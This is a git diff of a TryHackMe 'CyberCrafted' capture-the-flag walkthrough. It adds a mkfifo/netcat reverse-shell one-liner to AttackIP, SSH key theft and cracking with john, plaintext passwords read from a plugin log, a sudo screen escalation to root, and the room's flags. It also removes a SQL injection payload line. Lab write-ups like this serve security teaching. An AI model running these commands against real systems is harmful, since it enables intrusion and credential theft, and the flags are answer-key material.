@@ -1,5 +1,9 @@
-<p>June 25, 2025</p>p>
+<p>June 26, 2025</p>
 <h1>CyberCrafted</h1>
+<p>Pwn this pay-to-win Minecraft server!</p>
+
+![image](https://github.com/user-attachments/assets/05cb49a9-54bf-4e1f-9347-54a86a77505d)
+
 
 ```bash
 :~# nmap -sC -sV -O -A -p- -T4 TargetIP
@@ -396,11 +400,272 @@ Session completed.
 
 ![image](https://github.com/user-attachments/assets/158cbe1b-1ca5-4ba8-b439-36c1b6c8f83f)
 
-![image](https://github.com/user-attachments/assets/5356bd45-0e48-4357-9f22-4df9bb0a2c53)
+<p>rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc AttackIP 4444>f</p>
+
+```bash
+:~# nc -nlvp 4444
+...
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@cybercrafted:/var/www/admin$ ^Z
+[1]+  Stopped                 nc -nlvp 4444
+:~# stty raw -echo; fg
+nc -nlvp 4444
+
+www-data@cybercrafted:/var/www/admin$
+www-data@cybercrafted:/var/www/admin$ cd /home
+www-data@cybercrafted:/home$ ls
+cybercrafted  xxultimatecreeperxx
+www-data@cybercrafted:/home$ cd xxultimatecreeperxx
+www-data@cybercrafted:/home/xxultimatecreeperxx/.ssh$ ls
+authorized_keys  id_rsa
+www-data@cybercrafted:/home/xxultimatecreeperxx/.ssh$ cat id_rsa
+...
+```
+
+```bash
+:~# python3 /opt/john/ssh2john.py id_rsa > hash
+:~# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+...
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+...
+creepin2006      (id_rsa)
+...
+Session completed. 
+```
+
+```bash
+:~# ssh xxultimatecreeperxx@10.10.82.106 -i id_rsa
+Enter passphrase for key 'id_rsa': 
+xxultimatecreeperxx@cybercrafted:~$ find / -group minecraft 2>/dev/null
+/opt/minecraft
+/opt/minecraft/note.txt
+/opt/minecraft/minecraft_server_flag.txt
+/opt/minecraft/cybercrafted
+/opt/minecraft/cybercrafted/help.yml
+/opt/minecraft/cybercrafted/commands.yml
+/opt/minecraft/cybercrafted/world
+/opt/minecraft/cybercrafted/world/level.dat_mcr
+/opt/minecraft/cybercrafted/world/session.lock
+/opt/minecraft/cybercrafted/world/DIM-1
+/opt/minecraft/cybercrafted/world/DIM-1/data
+/opt/minecraft/cybercrafted/world/DIM-1/data/villages.dat
+/opt/minecraft/cybercrafted/world/DIM-1/forcedchunks.dat
+/opt/minecraft/cybercrafted/world/playerdata
+/opt/minecraft/cybercrafted/world/playerdata/77f6b2f8-e83c-458d-9795-6487671ad59f.dat
+/opt/minecraft/cybercrafted/world/DIM1
+/opt/minecraft/cybercrafted/world/DIM1/data
+/opt/minecraft/cybercrafted/world/DIM1/data/villages.dat
+/opt/minecraft/cybercrafted/world/DIM1/forcedchunks.dat
+/opt/minecraft/cybercrafted/world/data
+/opt/minecraft/cybercrafted/world/data/villages_nether.dat
+/opt/minecraft/cybercrafted/world/data/villages.dat
+/opt/minecraft/cybercrafted/world/data/villages_end.dat
+/opt/minecraft/cybercrafted/world/data/Fortress.dat
+/opt/minecraft/cybercrafted/world/forcedchunks.dat
+/opt/minecraft/cybercrafted/world/uid.dat
+/opt/minecraft/cybercrafted/world/stats
+/opt/minecraft/cybercrafted/world/stats/_madrins.json
+/opt/minecraft/cybercrafted/world/stats/hank20000.json
+/opt/minecraft/cybercrafted/world/stats/77f6b2f8-e83c-458d-9795-6487671ad59f.json
+/opt/minecraft/cybercrafted/world/players
+/opt/minecraft/cybercrafted/world/players/hank20000.dat
+/opt/minecraft/cybercrafted/world/players/_madrins.dat
+/opt/minecraft/cybercrafted/world/region
+/opt/minecraft/cybercrafted/world/region/r.-2.-3.mca
+/opt/minecraft/cybercrafted/world/region/r.-1.-2.mca
+/opt/minecraft/cybercrafted/world/region/r.-1.0.mca
+/opt/minecraft/cybercrafted/world/region/r.-2.-1.mca
+/opt/minecraft/cybercrafted/world/region/r.0.0.mca
+/opt/minecraft/cybercrafted/world/region/r.-3.0.mca
+/opt/minecraft/cybercrafted/world/region/r.-1.-1.mca
+/opt/minecraft/cybercrafted/world/region/r.-2.0.mca
+/opt/minecraft/cybercrafted/world/region/r.-3.-2.mca
+/opt/minecraft/cybercrafted/world/region/r.-3.-3.mca
+/opt/minecraft/cybercrafted/world/region/r.-3.-1.mca
+/opt/minecraft/cybercrafted/world/region/r.-2.-2.mca
+/opt/minecraft/cybercrafted/world/region/r.0.-1.mca
+/opt/minecraft/cybercrafted/permissions.yml
+/opt/minecraft/cybercrafted/server-icon.png
+/opt/minecraft/cybercrafted/world_the_end
+/opt/minecraft/cybercrafted/world_the_end/session.lock
+/opt/minecraft/cybercrafted/world_the_end/DIM1
+/opt/minecraft/cybercrafted/world_the_end/DIM1/region
+/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.-1.0.mca
+/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.0.0.mca
+/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.-1.-1.mca
+/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.0.-1.mca
+/opt/minecraft/cybercrafted/world_the_end/data
+/opt/minecraft/cybercrafted/world_the_end/uid.dat
+/opt/minecraft/cybercrafted/world_the_end/players
+/opt/minecraft/cybercrafted/white-list.txt
+/opt/minecraft/cybercrafted/craftbukkit-1.7.2-server.jar
+/opt/minecraft/cybercrafted/world_nether
+/opt/minecraft/cybercrafted/world_nether/session.lock
+/opt/minecraft/cybercrafted/world_nether/level.dat_old
+/opt/minecraft/cybercrafted/world_nether/DIM-1
+/opt/minecraft/cybercrafted/world_nether/DIM-1/region
+/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.-1.0.mca
+/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.0.0.mca
+/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.-1.-1.mca
+/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.0.-1.mca
+/opt/minecraft/cybercrafted/world_nether/level.dat
+/opt/minecraft/cybercrafted/world_nether/data
+/opt/minecraft/cybercrafted/world_nether/uid.dat
+/opt/minecraft/cybercrafted/world_nether/players
+/opt/minecraft/cybercrafted/plugins
+/opt/minecraft/cybercrafted/plugins/LoginSystem_v.2.4.jar
+/opt/minecraft/cybercrafted/plugins/LoginSystem
+/opt/minecraft/cybercrafted/plugins/LoginSystem/settings.yml
+/opt/minecraft/cybercrafted/plugins/LoginSystem/passwords.yml
+/opt/minecraft/cybercrafted/plugins/LoginSystem/log.txt
+/opt/minecraft/cybercrafted/plugins/LoginSystem/language.yml
+/opt/minecraft/cybercrafted/logs
+/opt/minecraft/cybercrafted/logs/2021-06-28-2.log.gz
+/opt/minecraft/cybercrafted/logs/2021-06-27-2.log.gz
+/opt/minecraft/cybercrafted/logs/2021-09-12-3.log.gz
+/opt/minecraft/cybercrafted/logs/2021-09-12-5.log.gz
+/opt/minecraft/cybercrafted/logs/2021-06-27-3.log.gz
+/opt/minecraft/cybercrafted/logs/2021-06-27-1.log.gz
+/opt/minecraft/cybercrafted/logs/2021-09-12-4.log.gz
+/opt/minecraft/cybercrafted/logs/2021-09-12-2.log.gz
+/opt/minecraft/cybercrafted/logs/2021-06-28-1.log.gz
+/opt/minecraft/cybercrafted/logs/2021-09-12-1.log.gz
+/opt/minecraft/cybercrafted/server.properties
+/opt/minecraft/cybercrafted/ops.txt
+/opt/minecraft/cybercrafted/bukkit.yml
+/opt/minecraft/cybercrafted/banned-ips.txt
+/opt/minecraft/cybercrafted/banned-players.txt
+```
+
+```bash
+xxultimatecreeperxx@cybercrafted:/opt/minecraft$ ls
+cybercrafted  minecraft_server_flag.txt  note.txt  WorldBackup
+xxultimatecreeperxx@cybercrafted:/opt/minecraft$ cat note.txt
+Just implemented a new plugin within the server so now non-premium Minecraft accounts can game too! :)
+- cybercrafted
+
+P.S
+Will remove the whitelist soon.
+```
+
+```bash
+xxultimatecreeperxx@cybercrafted:/opt/minecraft$ cat minecraft_server_flag.txt
+THM{ba93767ae3db9f5b8399680040a0c99e}
+```
+
+```bash
+xxultimatecreeperxx@cybercrafted:/opt/minecraft$ ls -lah
+total 24K
+drwxr-x--- 4 cybercrafted minecraft    4.0K Jun 27  2021 .
+drwxr-xr-x 3 root         root         4.0K Jun 27  2021 ..
+drwxr-x--- 7 cybercrafted minecraft    4.0K Jun 27  2021 cybercrafted
+-rw-r----- 1 cybercrafted minecraft      38 Jun 27  2021 minecraft_server_flag.txt
+-rw-r----- 1 cybercrafted minecraft     155 Jun 27  2021 note.txt
+drwxr-x--- 2 cybercrafted cybercrafted 4.0K Sep 12  2021 WorldBackup
+xxultimatecreeperxx@cybercrafted:/opt/minecraft$ cd cybercrafted
+xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted$ ls
+banned-ips.txt      commands.yml                  logs             plugins            white-list.txt  world_the_end
+banned-players.txt  craftbukkit-1.7.2-server.jar  ops.txt          server-icon.png    world
+bukkit.yml          help.yml                      permissions.yml  server.properties  world_nether
+xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted$ cd plugins
+xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins$ ls
+LoginSystem  LoginSystem_v.2.4.jar
+xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins$ cd LoginSystem
+```
+
+```bash
+xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ ls
+language.yml  log.txt  passwords.yml  settings.yml
+xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat passwords.yml
+cybercrafted: dcbf543ee264e2d3a32c967d663e979e
+madrinch: 42f749ade7f9e195bf475f37a44cafcb
+xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat log.txt
+
+[2021/06/27 11:25:07] [BUKKIT-SERVER] Startet LoginSystem!
+[2021/06/27 11:25:16] cybercrafted registered. PW: JavaEdition>Bedrock
+[2021/06/27 11:46:30] [BUKKIT-SERVER] Startet LoginSystem!
+[2021/06/27 11:47:34] cybercrafted logged in. PW: JavaEdition>Bedrock
+[2021/06/27 11:52:13] [BUKKIT-SERVER] Startet LoginSystem!
+[2021/06/27 11:57:29] [BUKKIT-SERVER] Startet LoginSystem!
+[2021/06/27 11:57:54] cybercrafted logged in. PW: JavaEdition>Bedrock
+[2021/06/27 11:58:38] [BUKKIT-SERVER] Startet LoginSystem!
+[2021/06/27 11:58:46] cybercrafted logged in. PW: JavaEdition>Bedrock
+[2021/06/27 11:58:52] [BUKKIT-SERVER] Startet LoginSystem!
+[2021/06/27 11:59:01] madrinch logged in. PW: Password123
+[2021/10/15 17:13:45] [BUKKIT-SERVER] Startet LoginSystem!
+[2021/10/15 20:36:21] [BUKKIT-SERVER] Startet LoginSystem!
+[2021/10/15 21:00:43] [BUKKIT-SERVER] Startet LoginSystem!
+[2025/06/26 02:29:31] [BUKKIT-SERVER] Startet LoginSystem!
+```
+
+```bash
+xultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ su cybercrafted
+Password: 
+cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ id
+uid=1002(cybercrafted) gid=1002(cybercrafted) groups=1002(cybercrafted)
+...
+cybercrafted@cybercrafted:cat user.txt
+THM{b4aa20aaf08f174473ab0325b24a45ca}
+...
+cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ sudo -l
+[sudo] password for cybercrafted: 
+Matching Defaults entries for cybercrafted on cybercrafted:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User cybercrafted may run the following commands on cybercrafted:
+    (root) /usr/bin/screen -r cybercrafted
+```
+
+```bash
+cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ sudo /usr/bin/screen -r cybercrafted
+```
+
+<p>CRTL + a<br>
+CTRL + c</p>
+
+```bash
+cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ sudo /usr/bin/screen -r cybercrafted
+```
+
+```bash
+# python3 -c 'import pty;pty.spawn("/bin/bash")'
+root@cybercrafted:/opt/minecraft/cybercrafted# cd /root
+root@cybercrafted:~# ls
+root.txt
+root@cybercrafted:~# cat root.txt
+THM{8bb1eda065ceefb5795a245568350a70}
+root@cybercrafted:~#
+
+```
 
 
+![image](https://github.com/user-attachments/assets/9f87a2da-f6a1-44f3-a2c3-be050be119ab)
+
+<br>
+<br>
+
+![image](https://github.com/user-attachments/assets/96204399-19f0-4f70-9f62-57447bd489c6)
+
+![image](https://github.com/user-attachments/assets/7dccf70b-1780-4d8a-9468-5e4990ba243b)
 
 
+<br>
 
-<p>search=tvXH' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x717a706b71,0x7a4645694f796772634a717a73706c4e50617971704d47706978796c574267596973706855545944,0x7170787171)-- -&submit=</p>
+<div align="center">
 
+| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
+| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
+|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
+| June 25, 2025     | 416      |     179ᵗʰ    |      5ᵗʰ     |     258ᵗʰ   |     6ᵗʰ    |  110,591 |    803   |     63    |
+
+</div>
+
+![image](https://github.com/user-attachments/assets/c8d3087d-e765-4e77-97bc-2c592a6c90cf)
+
+![image](https://github.com/user-attachments/assets/d3b764fe-b6bb-4123-b2c3-9fd051e96f48)
+
+![image](https://github.com/user-attachments/assets/f9c35247-6303-494c-bac3-5d392d0ed6ec)
+
+![image](https://github.com/user-attachments/assets/9a3e6fae-f490-4c0c-8062-78f5372a8427)
+
+![image](https://github.com/user-attachments/assets/d6e61d30-a4a6-4015-9155-8fdae95dbc4d)
